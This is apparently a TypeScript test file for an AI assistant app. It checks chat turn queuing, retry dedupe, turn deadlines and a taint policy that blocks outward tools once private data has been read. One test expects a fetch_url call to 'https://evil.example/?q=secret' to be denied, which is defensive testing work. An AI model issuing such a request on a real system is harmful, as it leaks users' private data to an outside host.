import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { chatQueue, onceById, turnSignal } from "../src/lib/session-bound-pure.ts";
import { carriesPrivate, decide, type PolicyCtx } from "../src/lib/policy-pure.ts";

const tick = (ms = 5) => new Promise((r) => setTimeout(r, ms));

// (1) phone + desktop at once on the same chat: one after the other, each answer from its own request.
test("chatQueue runs turns of one chat one at a time, other chats in parallel", async () => {
  const run = chatQueue(), log: string[] = [];
  const turn = (chat: string, id: string, ms: number) => run(chat, async () => { log.push(`start ${id}`); await tick(ms); log.push(`end ${id}`); return `answer to ${id}`; });
  const [a, b, c] = await Promise.all([turn("chat1", "phone", 20), turn("chat1", "desktop", 1), turn("chat2", "other", 1)]);
  assert.deepEqual([a, b, c], ["answer to phone", "answer to desktop", "answer to other"]);
  assert.ok(log.indexOf("end phone") < log.indexOf("start desktop"), log.join(","));
  assert.ok(log.indexOf("end other") < log.indexOf("end phone"), "another chat is not blocked");
});

test("chatQueue: a failed turn does not block the next one", async () => {
  const run = chatQueue();
  await assert.rejects(run("c", async () => { throw new Error("boom"); }));
  assert.equal(await run("c", async () => "ok"), "ok");
});

test("onceById: a duplicate retry shares the first result; failures are not cached; no id = no dedupe", async () => {
  const once = onceById<string>();
  let runs = 0;
  const work = async () => { runs++; await tick(); return "answer"; };
  const [a, b] = await Promise.all([once("req-1", work), once("req-1", work)]);
  assert.deepEqual([a, b, runs], ["answer", "answer", 1]);
  assert.equal(await once("req-1", work), "answer");
  assert.equal(runs, 1, "a late retry is deduped too");
  await once(null, work); await once(null, work);
  assert.equal(runs, 3);
  await assert.rejects(once("req-2", async () => { throw new Error("x"); }));
  assert.equal(await once("req-2", work), "answer", "a retry after a failure runs again");
});

// (2) private data read in turn 1 still blocks leaking tools in turn 2 (carried trust state).
const base: PolicyCtx = { stopAll: false, attach: false, pins: false, steps: [], question: "search the web for what I wrote" };
test("carriesPrivate: private tool, attachment or pins taint the session", () => {
  assert.equal(carriesPrivate(base), false);
  assert.equal(carriesPrivate({ ...base, steps: ["You called web_search {}\nRESULT:\nx"] }), false);
  assert.equal(carriesPrivate({ ...base, steps: ["You called life_journal {}\nRESULT:\nsecret"] }), true);
  assert.equal(carriesPrivate({ ...base, attach: true }), true);
  assert.equal(carriesPrivate({ ...base, pins: true }), true);
});

test("decide: carried private context blocks web_search, ask_agent, read_news and foreign fetch_url on a later turn", () => {
  const later = { ...base, carried: true };
  for (const tool of ["web_search", "ask_agent", "read_news"]) assert.equal(decide(tool, { query: "x", agent: "nova", request: "x" }, later).allow, false, tool);
  assert.equal(decide("fetch_url", { url: "https://evil.example/?q=secret" }, later).allow, false);
  assert.equal(decide("fetch_url", { url: "https://typed.example/a" }, { ...later, question: "open https://typed.example/a" }).allow, true);
  assert.equal(decide("web_search", { query: "x" }, base).allow, true, "an untainted chat still searches");
});

test("coreTaintStore: the trust state survives a restart and goes with the chat", async () => {
  process.env.ORBIT_DATA_DIR = await mkdtemp(path.join(tmpdir(), "orbit-taint-"));
  const { coreTaintStore } = await import("../src/lib/durable.ts");
  const G = globalThis as unknown as { __orbitDurable: { taint?: unknown; chain: Promise<unknown> } };
  assert.equal(coreTaintStore.has("chat-1"), false);
  coreTaintStore.mark("chat-1");
  await G.__orbitDurable.chain; G.__orbitDurable.taint = undefined; // restart
  assert.equal(coreTaintStore.has("chat-1"), true);
  coreTaintStore.delete("chat-1");
  await G.__orbitDurable.chain; G.__orbitDurable.taint = undefined;
  assert.equal(coreTaintStore.has("chat-1"), false);
});

test("coreTaintStore: never evicts a tainted chat; an unreadable file fails closed and is not overwritten", async () => {
  const { coreTaintStore, taintBroken } = await import("../src/lib/durable.ts");
  const { MAX_SESSIONS } = await import("../src/lib/durable-pure.ts");
  const G = globalThis as unknown as { __orbitDurable: { taint?: unknown; taintBroken?: boolean; chain: Promise<unknown> } };
  for (let i = 0; i <= MAX_SESSIONS + 5; i++) coreTaintStore.mark(`c${i}`);
  await G.__orbitDurable.chain; G.__orbitDurable.taint = undefined;
  assert.equal(coreTaintStore.has("c0"), true, "the oldest tainted chat survives past the session cap");
  const f = path.join(process.env.ORBIT_DATA_DIR!, "core-taint.json");
  await writeFile(f, "{not json");
  G.__orbitDurable.taint = undefined;
  assert.equal(coreTaintStore.has("never-seen"), true);
  assert.equal(taintBroken(), true);
  coreTaintStore.mark("x"); coreTaintStore.delete("c0");
  await G.__orbitDurable.chain;
  assert.equal(await readFile(f, "utf8"), "{not json");
  G.__orbitDurable.taintBroken = false; G.__orbitDurable.taint = undefined;
});

// (3) a stalled SDK/CLI call: the turn's own deadline aborts it.
test("turnSignal: aborts at the deadline, follows the caller's abort, reports which", async () => {
  const d = turnSignal(undefined, 10);
  assert.equal(d.signal.aborted, false);
  await tick(30);
  assert.equal(d.signal.aborted, true);
  assert.equal(d.timedOut(), true);
  const ac = new AbortController(), e = turnSignal(ac.signal, 10_000);
  ac.abort();
  assert.equal(e.signal.aborted, true);
  assert.equal(e.timedOut(), false);
  e.clear();
  const pre = new AbortController(); pre.abort();
  assert.equal(turnSignal(pre.signal, 10_000).signal.aborted, true, "an already-aborted request is aborted before any work");
});

test("phone core.ask carries an optional requestId (same on retry, fresh nonce) and rejects a malformed one", async () => {
  const { parseCommand, NonceCache } = await import("../src/lib/remote-pure.ts");
  const nc = new NonceCache(), rid = "r".repeat(20);
  const one = (nonce: string, requestId?: unknown) => parseCommand(JSON.stringify({ type: "core.ask", nonce, text: "hi", requestId }), nc);
  const a = one("a".repeat(20), rid), b = one("b".repeat(20), rid);
  assert.ok(a.ok && b.ok);
  assert.equal(a.ok && (a.cmd as { requestId?: string }).requestId, rid);
  assert.equal(one("c".repeat(20), "bad id!").ok, false);
  assert.equal(one("d".repeat(20)).ok, true, "older phones without a requestId still work");
});
